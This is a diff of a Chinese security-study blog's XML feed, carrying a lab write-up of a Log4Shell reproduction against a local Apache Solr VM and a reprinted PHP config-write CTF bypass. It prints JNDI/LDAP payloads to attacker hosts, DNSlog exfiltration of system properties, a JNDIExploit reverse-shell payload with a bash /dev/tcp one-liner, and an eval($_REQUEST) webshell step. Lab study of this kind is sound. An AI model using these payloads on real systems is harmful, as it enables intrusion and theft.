-<p><code>JNDI</code>（<code>Java</code>命名和目录接口），是<code>Java</code>提供的一个目录服务应用程序接口（<code>API</code>）</p>
-<p>它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象 </p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">其中大致有</span><br><span class="line">远程方法调用（RMI），通用对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）</span><br></pre></td></tr></table></figure>
-
-<p>其大致组成为</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String jndiName= ...;<span class="comment">//指定需要查找name名称</span></span><br><span class="line"><span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">//初始化默认环境</span></span><br><span class="line"><span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSourse)context.lookup(jndiName);<span class="comment">//查找该name的数据</span></span><br></pre></td></tr></table></figure>
-
-<p><u><strong>所以如果能控制<code>jndiName</code>，再利用<code>rmi</code>之类的加载远程类文件进行调用，就可能实现远程代码执行</strong></u></p>
-<h3 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h3><p>结合<code>lookup</code>和<code>jndi</code></p>
-<p><strong>对于<code>payload</code></strong></p>
-<p><code>$&#123;jndi:ldap://evil.com/example&#125;</code>是<code>Log4j2</code>中使用的<strong>占位符</strong>语法。<strong>它表示在日志消息中插入一个使用</strong></p>
-<p><strong><code>JNDILookup</code>对象查找的值</strong></p>
-<p><code>ldap://evil.com/example</code>是<code>JNDI</code>查找所使用的名称。这意味着<code>Log4j2</code>将在<code>JNDI</code>上下文中查找名为<code>example</code></p>
-<p>的对象，该对象位于<code>evil.com</code>服务器上，就可能实现访问一些敏感信息以及其他恶意操作的目的</p>
-<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="利用DNSlog验证漏洞"><a href="#利用DNSlog验证漏洞" class="headerlink" title="利用DNSlog验证漏洞"></a>利用DNSlog验证漏洞</h3><p>访问<code>http://www.dnslog.cn/</code></p>
-<p>先<code>Get SubDomain</code>获取一个子域名</p>
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220145121926.png" alt="image-20221220145121926"></p>
-<p>但是既然是注入，那肯定是存在参数注入点，查看官方<code>solr</code>文档，得到在<code>cores</code>里</p>
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220145505204.png" alt="image-20221220145505204"></p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/admin/</span>cores?action=</span><br></pre></td></tr></table></figure>
-
-<p>其中<code>action</code>参数可控，有很大可能是注入点</p>
-<p>于是把我们的<code>dnslog</code>获取的子域名按<code>payload</code>形式添加到<code>url</code>后参数中</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="regexp">/4d5do5.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>访问查看</p>
-<p><code>DNSlog</code>收到了访问请求</p>
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220145131607.png" alt="image-20221220145131607"></p>
-<p>同时在靶机页面下也有<code>DNSlog</code>子域名回显，虽然是</p>
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220145054026.png" alt="image-20221220145054026"></p>
-<p>说明这里的<code>$&#123;jndi:ldap://eavgk6.dnslog.cn&#125;</code>，确实达到了访问的作用</p>
-<p>故此推断<code>log4j2</code>漏洞存在</p>
-<h3 id="信息泄露漏洞"><a href="#信息泄露漏洞" class="headerlink" title="信息泄露漏洞"></a>信息泄露漏洞</h3><p>这里可以利用脚本分析中<code>exploitdb</code>里的信息泄露脚本即可</p>
-<p>按照脚本原理也是利用占位符，也就是<code>payload</code>的形式，但是参数为系统属性，这些属性会自动返回对应的值，</p>
-<p>最后脚本通过对返回数据的解析，就可以得到敏感数据</p>
-<p>当然直接通过访问得到消息也是可以的</p>
-<p>比如<code>$&#123;sys:os.version&#125;</code>，就得到我们靶机的系统内核版本号为<code>5.15.0-56-generic</code></p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="regexp">/$&#123;sys:os.version&#125;.7b09py.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220220840849.png" alt="image-20221220220840849"></p>
-<p>对于<code>usr.name</code>，以及<code>os.name</code>等等都是可以实现</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="regexp">/$&#123;sys:user.name&#125;.7b09py.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220175405653.png" alt="image-20221220175405653"></p>
-<p>以下就是在<code>log4j2</code>其他可用系统属性列表</p>
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220170944260.png" alt="image-20221220170944260"></p>
-<h3 id="远程代码执行漏洞"><a href="#远程代码执行漏洞" class="headerlink" title="远程代码执行漏洞"></a>远程代码执行漏洞</h3><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">攻击机kali <span class="built_in">ip</span>:<span class="number">192</span>.<span class="number">168</span>.<span class="number">80</span>.<span class="number">128</span></span><br><span class="line">攻击机kali 监听端口:<span class="number">8888</span></span><br><span class="line">靶机ubuntu <span class="built_in">ip</span>:<span class="number">192</span>.<span class="number">168</span>.<span class="number">80</span>.<span class="number">131</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="JNDIExploit-1-2-SNAPSHOT-jar利用JNDI注入反弹shell"><a href="#JNDIExploit-1-2-SNAPSHOT-jar利用JNDI注入反弹shell" class="headerlink" title="JNDIExploit-1.2-SNAPSHOT.jar利用JNDI注入反弹shell"></a>JNDIExploit-1.2-SNAPSHOT.jar利用JNDI注入反弹shell</h4><p>该工具的原理我剖析了一下，</p>
-<p>先启动工具</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">java</span> -jar JNDIExploit-<span class="number">1</span>.<span class="number">2</span>-SNAPSHOT.jar -i <span class="number">192.168.80.128</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221221163132059.png" alt="image-20221221163132059"></p>
-<p>简单来讲就是在攻击机【<code>192.168.80.128</code>】的的<code>1389</code>端口搭建起了一个服务器，其中放置了一个恶意类，</p>
-<p>通过利用靶机网站<code>JNDI</code>注入漏洞把这个恶意类进行远程加载，从而执行了命令</p>
-<p>利用<code>JNDIExploit-1.2-SNAPSHOT.jar</code>最好的就是简化了<code>1.0</code>的繁杂参数</p>
-<p>只需要构造<code>payload</code></p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="regexp">/192.168.80.128:1389/</span>Basic<span class="regexp">/ReverseShell/</span><span class="number">192.168</span>.<span class="number">80.128</span>/<span class="number">6666</span>&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>/Basic/ReverseShell/</code>中其实就包含反弹<code>shell</code>的命令</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/xx.xx.xx.xx/</span>xxxx <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">*这里的</span><br><span class="line"><span class="regexp">/xx.xx.xx.xx/</span>xxxx</span><br><span class="line">就是其后跟上的参数</span><br><span class="line"><span class="regexp">/192.168.80.128/</span><span class="number">6666</span></span><br></pre></td></tr></table></figure>
-
-<p>于是就是<code>/Basic/ReverseShell/192.168.80.128/6666</code>被恶意类包含</p>
-<p>然后在攻击机监听<code>6666</code>端口</p>
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221221203418508.png" alt="image-20221221203418508"></p>
-<p>最后访问<code>payload</code>，触发</p>
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221221203458628.png" alt="image-20221221203458628"></p>
-<p>成功反弹到<code>shell</code></p>
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221221203538282.png" alt="image-20221221203538282"></p>
-<p>测试完毕</p>
-<h1 id="PHP写入配置文件的经典漏洞"><a href="#PHP写入配置文件的经典漏洞" class="headerlink" title="PHP写入配置文件的经典漏洞"></a>PHP写入配置文件的经典漏洞</h1><p>在一个比赛中了解到的一个漏洞，关键在于绕过函数从而包含</p>
-<p><a href="https://bbs.zkaq.cn/t/6045.html">转载文章</a></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span>`</span><br><span class="line">`<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>])) <span class="keyword">die</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>]);`</span><br><span class="line">`<span class="variable">$file</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>);`</span><br><span class="line">`<span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="string">&quot;\$option=&#x27;<span class="subst">$str</span>&#x27;;&quot;</span>, <span class="variable">$file</span>);`</span><br><span class="line">`<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>, <span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
-
-
-<p><code>config.php</code> 的内容如下:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-
-<p>要求是要<code>getshell</code>,这个场景十分经典，常用在修改配置文件写入的时候。<br>此处不存在之前说的那个配置文件中用的是<code>”双引号”</code>引起任意代码执行的问题,这这里面用的是单引号,而且 <code>addslashes()</code>处理过了,看似很安全,但是对于脑子里有个黑洞的搞安全的人来讲,这个还真是有问题的.</p>
-<h2 id="方法一-利用换行符来绕过正则匹配的问题"><a href="#方法一-利用换行符来绕过正则匹配的问题" class="headerlink" title="方法一,利用换行符来绕过正则匹配的问题"></a>方法一,利用换行符来绕过正则匹配的问题</h2><p>可以看到正则匹配的是以下内容:</p>
-<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$optio</span>n=<span class="string">&#x27;任意内容&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-<p>任意内容里面是可以包含转移符 <code>\</code> 的,所以我们利用下面的方法:</p>
-<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();//</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a</span></span><br></pre></td></tr></table></figure>
-
-
-<p>执行完第一个之后,<code>config.php</code>中的内容为:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a\&#x27;;</span></span><br><span class="line"><span class="string">phpinfo();//&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>但是这样并没有办法执行<code>phpinfo()</code>,因为我们插入的 单引号 被转移掉了,所以<code>phpinfo()</code>还是在单引号的包裹之内.<br>我们在访问下面这个</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>/index.php?option=a</span><br></pre></td></tr></table></figure>
-
-
-<p>因为正则 <code>.*</code> 会匹配行内的任意字符无数次.所以 <code>\</code> 也被认为是其中的一部分,也会被替换掉,执行完之后,<code>config.php</code>中的内容为:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure>
-
-
-<p>转义符就被替换掉了,就成功的<code>getshell</code>.</p>
-<h2 id="方法二-利用-preg-replace函数的问题"><a href="#方法二-利用-preg-replace函数的问题" class="headerlink" title="方法二,利用 preg_replace函数的问题:"></a>方法二,利用 preg_replace函数的问题:</h2><p>用<code>preg_replace()</code>的时候<code>replacement(第二个参数)</code>也要经过正则引擎处理，所以正则引擎把<code>\\</code>转义成了<code>\</code><br>也就是说如果字符串是<code>\\\&amp;#39;</code>,经过 <code>preg_replace()</code>的处理,就变为 <code>#39;</code>,单引号就逃出来了.<br>所以<code>payload</code>如下:</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/index.php?option=a\&#x27;;phpinfo();/</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure>
-
-
-<p><code>config.php</code>变为:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a\\&#x27;</span>;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure>
-
-<p>**道理就是  <code>a\&amp;#39;;phpinfo();//</code>  经过 <code>addslashes()</code>处理之后,变为<code>a\\\&amp;#39;;phpinfo();//</code> 然后两个反斜杠被<code>preg_replace</code>变成了一个,导致单引号逃脱.</p>
-<h2 id="方法三-利用-preg-replace-函数的第二个参数的问题"><a href="#方法三-利用-preg-replace-函数的第二个参数的问题" class="headerlink" title="方法三, 利用 preg_replace() 函数的第二个参数的问题"></a>方法三, 利用 preg_replace() 函数的第二个参数的问题</h2><p>先看官方对<code>preg_replace()</code>函数的描述<code>manual</code><br>函数原型:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xed <span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] )</span><br></pre></td></tr></table></figure>
-
-
-<p>对<code>replacement</code>的描述.<br><code>replacement</code>中可以包含后</p>
-<p>向<code>引用\\n或(php 4.0.4以上可用)$n</code>，语法上首选后者。 每个 这样的引用将被匹配到的第<code>n</code>个捕获子组捕获到的文本替换。 <code>n</code> 可以是<code>0-99</code>，<code>\\0</code>和<code>$0</code>代表完整的模式匹配文本。</p>
-<p>所以我们可以用:</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=;phpinfo();</span><br><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option= 或者 http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=<span class="variable">$0</span></span><br></pre></td></tr></table></figure>
-
-
-<p>执行第一条后<code>config.php</code>的内容为:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;;phpinfo();&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-
-<p>再执行第二条后<code>config.php</code>的内容为:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;$option=&#x27;</span>;<span class="title function_ invoke__">phpinfo</span>();<span class="string">&#x27;;&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-
-<p>刚好闭合掉了前后的两个单引号中间的逃脱出来了.想出这个办法的人,思路真是可以的.</p>
-<hr>
-<p>要<code>getshell</code>直接</p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">把<span class="built_in">phpinfo</span>()替换成</span><br><span class="line"><span class="function"><span class="title">eval</span><span class="params">($_REQUEST[<span class="number">123</span>])</span></span></span><br><span class="line"><span class="function"><span class="title">assert</span><span class="params">($_REQUEST[<span class="number">123</span>])</span></span></span><br><span class="line">蚁剑连接即可</span><br></pre></td></tr></table></figure>
-
-<hr>
-]]></content>
-      <categories>
-        <category>网络安全学习</category>
-      </categories>
-      <tags>
-        <tag>实战</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>WEB学习</title>
     <url>/2022/05/28/Web-study/</url>
     <content><![CDATA[<p><u><code>学会一样东西，最重要特征就是可以把一个知识点的原理弄懂，造成一次成功注入，要注意分析源码当中导致这个漏洞的问题点，又应该如何改进与防御，</code></u></p>
@@ -1198,6 +903,301 @@ handler 指向RequestHandler
       </categories>
       <tags>
         <tag>web基础+进阶学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞学习</title>
+    <url>/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<p><strong><code>想把一些常见的CVE以及一些经典漏洞复现，做做笔记</code></strong></p>
+<h1 id="CVE-2021-44228"><a href="#CVE-2021-44228" class="headerlink" title="CVE-2021-44228"></a>CVE-2021-44228</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Apache</span> Log4j2 是一个被广泛使用的开源日志记录库，<span class="number">2017</span> 年 <span class="number">7</span> 月时，有人向 Log4j2 提了支持 JNDI Lookup 的需求，并从 <span class="number">2</span>.<span class="number">0</span>-beta9 之后开始支持；今年阿里的安全研究人员发现该特性会导致远程代码执行，于 <span class="number">2021</span> 年 <span class="number">11</span> 月 <span class="number">24</span> 日向 Apache 报告了该漏洞；<span class="number">12</span> 月 <span class="number">5</span> 日官方发布了补丁；到了 <span class="number">12</span> 月 <span class="number">9</span> 日晚，PoC 的传播范围开始变得不可控，基本上各大厂商都受影响，影响范围很广，于是人们给它起了个名字——Log4Shell。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="attribute">环境搭建虚拟机版本</span><span class="punctuation">:</span> <span class="string">ubuntu 20.4</span></span><br><span class="line"><span class="attribute">Apache solr版本</span><span class="punctuation">:</span> <span class="string">8.11.0</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Apache-solr-8-11-0下载"><a href="#Apache-solr-8-11-0下载" class="headerlink" title="Apache solr 8.11.0下载"></a>Apache solr 8.11.0下载</h3><p>这里我采用的是<code>Apache Solr</code>开源服务器</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Solr是Apache下的一个顶级开源项目，采用Java开发，它是基于Lucene的全文搜索服务器。Solr提供了比Lucene更为丰富的查询语言，同时实现了可配置、可扩展，并对索引、搜索性能进行了优化。</span><br></pre></td></tr></table></figure>
+
+<p>针对漏洞修复时间<code>[12 月 5 日]</code>，和官方更新文档</p>
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201005804892.png" alt="image-20221201005804892"></p>
+<p><code>Apache Solr 8.11.0</code>是<code>CVE-2021-44228</code>修复前的最后的一个版本</p>
+<p>所以该版本也存在<code>CVE-2021-44228</code></p>
+<p>于是下载</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>archive.apache.org<span class="regexp">/dist/</span>lucene<span class="regexp">/solr/</span><span class="number">8.11</span>.<span class="number">0</span>/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201010242171.png" alt="image-20221201010242171"></p>
+<h3 id="JAVA配置"><a href="#JAVA配置" class="headerlink" title="JAVA配置"></a>JAVA配置</h3><p>由于<code>Apache solr</code>是基于<code>Java</code>开发的项目，所以需要先下载对应版本的<code>Java</code></p>
+<p><strong>但是针对log4j2存在的版本，需要jdk1.8.0才可以复现</strong></p>
+<p>但是</p>
+<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">高版本的JDK环境中trustURLCodebase变量为false，限制了远程类的加载，导致JNDI注入利用失败，无法反弹shell</span><br><span class="line">能实现利用条件：版本≤ JDK <span class="number">6u211、7u201</span>、 <span class="number">8u191、11.0</span>.<span class="number">1</span>。</span><br><span class="line">但是过低版本的，solr运行可能会出错</span><br></pre></td></tr></table></figure>
+
+<p>所以这里从官网下载专门的<code>8u171</code></p>
+<h4 id="解压到对应目录"><a href="#解压到对应目录" class="headerlink" title="解压到对应目录"></a>解压到对应目录</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">tar -zxvf jdk-<span class="number">8</span>u171-linux-x64.tar.gz -C <span class="regexp">/usr/</span>local<span class="regexp">/jdk/</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221221161421513.png" alt="image-20221221161421513"></p>
+<h4 id="部署并修改环境变量"><a href="#部署并修改环境变量" class="headerlink" title="部署并修改环境变量"></a>部署并修改环境变量</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vi ~/.bashrc</span><br><span class="line">在文件末尾追加下面6行内容</span><br><span class="line"><span class="comment">#set oracle jdk environment</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/local/jdk/jdk1.8.0_171 <span class="comment">## 这里要注意目录要换成自己解压的jdk 目录</span></span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre  </span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib  </span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">sudo update-alternatives --install /usr/bin/java java /usr/local/jdk/jdk1.8.0_171/bin/java 300</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h4><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">version</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221221161638879.png" alt="image-20221221161638879"></p>
+<h3 id="Solr下载"><a href="#Solr下载" class="headerlink" title="Solr下载"></a><code>Solr</code>下载</h3><p>下载<code>solr 8.11.0</code></p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> wget https://archive.apache.org/dist/lucene/solr/<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>/solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201111930502.png" alt="image-20221201111930502"></p>
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201112302036.png" alt="image-20221201112302036"></p>
+<p>然后就解压</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> tar xzf solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201112554067-1671632324475-1.png" alt="image-20221201112554067"></p>
+<h3 id="安装-Apache-Solr服务"><a href="#安装-Apache-Solr服务" class="headerlink" title="安装 Apache Solr服务"></a>安装 <code>Apache Solr</code>服务</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> bash solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>/bin/install_solr_service.sh solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201112725299.png" alt="image-20221201112725299"></p>
+<p>查看服务状态</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo systemctl status solr</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201112839632.png" alt="image-20221201112839632"></p>
+<p>发现服务已经存在</p>
+<p>启动</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo <span class="regexp">/lib/</span>systemd/systemd-sysv-install enable solr</span><br><span class="line"><span class="comment">#若执行sudo systemctl enable solr会提示不是本机服务，需要按上面方式启动运行</span></span><br></pre></td></tr></table></figure>
+
+<p>因为<code>solr</code>默认运行的端口为<code>8983</code></p>
+<p>查看环境搭建的虚拟机<code>ip</code></p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ip <span class="selector-tag">a</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201113319037.png" alt="image-20221201113319037"></p>
+<p>得到环境搭建靶机<code>ip</code>为</p>
+<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.80.131</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="成功"><a href="#成功" class="headerlink" title="成功"></a>成功</h3><p>浏览器访问</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220220624019.png" alt="image-20221220220624019"></p>
+<p>搭建成功</p>
+<p>内网环境中的攻击机也成功访问</p>
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201115827107.png" alt="image-20221201115827107"></p>
+<p>环境搭建完毕</p>
+<h2 id="脚本分析"><a href="#脚本分析" class="headerlink" title="脚本分析"></a>脚本分析</h2><p>这里调用**<code>exploitdb</code>**中的对<code>Log4j2</code>利用的脚本，这是一个信息泄露的脚本</p>
+<p>发布时间: <code>12/12/2021</code></p>
+<p><code>【ps.这个脚本可能是作者上传到exp的时候空格问题，需要稍微修改一下就可以用了】</code></p>
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221204224323306-1671800988704-1.png" alt="image-20221204224323306"></p>
+<p>脚本内容</p>
